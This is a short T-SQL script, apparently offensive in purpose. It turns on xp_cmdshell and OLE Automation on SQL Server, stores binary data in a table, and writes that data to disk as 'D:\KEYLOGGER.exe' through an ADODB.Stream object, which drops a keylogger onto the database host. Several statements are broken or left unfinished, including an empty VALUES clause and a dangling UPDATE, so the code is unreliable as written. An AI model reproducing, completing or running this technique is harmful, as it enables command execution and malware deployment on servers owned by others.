 --CHANGE SQL SERVER CONFIGURATION
EXEC SP_CONFIGURE 'show advanced options',1
RECONFIGURE WITH OVERRIDE

EXEC SP_CONFIGURE 'Ole Automation Procedures',1
RECONFIGURE WITH OVERRIDE

EXEC SP_CONFIGURE 'XP_CMDSHELL',1
RECONFIGURE WITH OVERRIDE


 --WRITE BINARY DATA TO SQL TABLE 
 IF NOT EXISTS (SELECT * FROM SYSOBJECTS WHERE XTYPE='U' AND NAME LIKE FILES )
 BEGIN
	CREATE TABLE FILES (ID INT IDENTITY(1,1),FILEDATA VARBINARY(MAX))
 END
 
 INSERT INTO FILES (FILEDATA) 
 VALUES ()

 UPDATE FILES set 
 
 --WRITING BINARY DATA TO FILE 
 DECLARE @SQLIMG VARCHAR(MAX),
    @IMG_PATH VARBINARY(MAX),
    @TIMESTAMP VARCHAR(MAX),
    @ObjectToken INT
	SELECT top 1 @IMG_PATH=FILEDATA from FILES ORDER BY 1 DESC 
		EXEC sp_OACreate 'ADODB.Stream', @ObjectToken OUTPUT
        EXEC sp_OASetProperty @ObjectToken, 'Type', 1
        EXEC sp_OAMethod @ObjectToken, 'Open'
        EXEC sp_OAMethod @ObjectToken, 'Write', NULL, @IMG_PATH
        EXEC sp_OAMethod @ObjectToken, 'SaveToFile', NULL, 'D:\KEYLOGGER.exe', 2
        EXEC sp_OAMethod @ObjectToken, 'Close'
        EXEC sp_OADestroy @ObjectToken
 
